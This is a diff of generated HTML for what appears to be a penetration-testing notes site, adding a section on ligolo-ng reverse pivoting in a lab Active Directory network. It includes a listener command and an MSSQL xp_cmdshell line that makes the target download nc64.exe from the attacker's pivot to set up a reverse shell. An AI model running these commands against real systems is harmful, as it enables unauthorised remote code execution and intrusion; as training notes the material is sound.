@@ -3852,6 +3852,17 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#reverse-proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reverse proxy
+      
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -28293,6 +28304,17 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#reverse-proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reverse proxy
+      
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -28421,10 +28443,47 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>To remove this redirection:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>sudo ip route delete 240.0.0.1/32 dev ligolo
 </span></code></pre></div></td></tr></table></div>
+<h2 id="reverse-proxy">Reverse proxy</h2>
+<p>In this topology:</p>
+<table>
+<thead>
+<tr>
+<th>my Kali</th>
+<th>pivot machine</th>
+<th>target machine in AD</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>192.168.10.123</td>
+<td>192.168.10.200</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>10.10.10.200</td>
+<td>10.10.10.14</td>
+</tr>
+</tbody>
+</table>
+<p>After setting a ligolo agent in the pivot machine and starting the tunel, we achieve to access a service in the target machine. We want to set a rev shell, but the machine does not know how to route the connection back to us. We need to set in the ligolo proxy a listener:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>ligolo-ng » listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999
+</span></code></pre></div></td></tr></table></div>
+<p>Now, lets say, if we have access to this MSQL terminal we can:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
+<span class="normal"><a href="#__codelineno-13-2">2</a></span>
+<span class="normal"><a href="#__codelineno-13-3">3</a></span>
+<span class="normal"><a href="#__codelineno-13-4">4</a></span>
+<span class="normal"><a href="#__codelineno-13-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a># in our kali machine
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>python -m http.server 9999
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a># In the target machine
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a>EXEC xp_cmdshell &#39;powershell -c &quot;curl.exe http://$IPpivot:9999/nc64.exe -o C:\Users\Public\nc64.exe&quot;&#39;;
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 20, 2026 15:28:12 UTC"><span class="timeago" datetime="2026-03-20T15:28:12+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 20, 2026 15:28:12 UTC">2026-03-20</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 30, 2026 20:15:40 UTC"><span class="timeago" datetime="2026-03-30T20:15:40+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 30, 2026 20:15:40 UTC">2026-03-30</span></small></br>
 
 
     <small>Created: June 1, 2025 11:12:15</small>
